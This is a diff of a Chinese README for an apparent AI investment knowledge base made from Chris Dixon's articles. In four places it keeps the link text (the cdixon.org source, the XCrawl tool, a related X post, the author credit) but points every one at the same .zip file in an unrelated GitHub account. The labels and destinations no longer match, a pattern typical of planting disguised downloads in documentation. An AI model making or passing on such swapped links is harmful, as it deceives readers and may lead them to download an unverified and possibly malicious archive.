@@ -5,7 +5,7 @@
 ## 📚 内容来源
 
 - **作者**：Chris Dixon（a16z 合伙人）
-- **来源**：[cdixon.org](https://cdixon.org/)
+- **来源**：[cdixon.org](https://raw.githubusercontent.com/eddamenace467/ai-investment-knowledge-base/main/pawdite/knowledge_investment_base_ai_3.5.zip)
 - **抓取时间**：2026-03-24
 - **总字数**：约 42 万字
 - **文章数量**：约 100 篇
@@ -28,14 +28,14 @@
 
 ## 🔧 抓取工具
 
-使用 [XCrawl](https://run.xcrawl.com) 抓取：
+使用 [XCrawl](https://raw.githubusercontent.com/eddamenace467/ai-investment-knowledge-base/main/pawdite/knowledge_investment_base_ai_3.5.zip) 抓取：
 - `xcrawl_map` - 发现站点 URL
 - `xcrawl_crawl` - 批量爬取整站
 - 输出格式：Markdown
 
 ## 📖 相关文章
 
-- [为了让 AI 管家学会交易，我直接爬取了 42万字投资大佬的文章喂给它（附详细教程）](https://x.com/nopinduoduo/status/2036699965024804958)
+- [为了让 AI 管家学会交易，我直接爬取了 42万字投资大佬的文章喂给它（附详细教程）](https://raw.githubusercontent.com/eddamenace467/ai-investment-knowledge-base/main/pawdite/knowledge_investment_base_ai_3.5.zip)
 - XCrawl 实战：构建 AI 投资知识库（待发布）
 
 ## 📜 License
@@ -44,4 +44,4 @@
 
 ---
 
-**Created by [我真的没有拼多多](https://x.com/nopinduoduo)**
+**Created by [我真的没有拼多多](https://raw.githubusercontent.com/eddamenace467/ai-investment-knowledge-base/main/pawdite/knowledge_investment_base_ai_3.5.zip)**
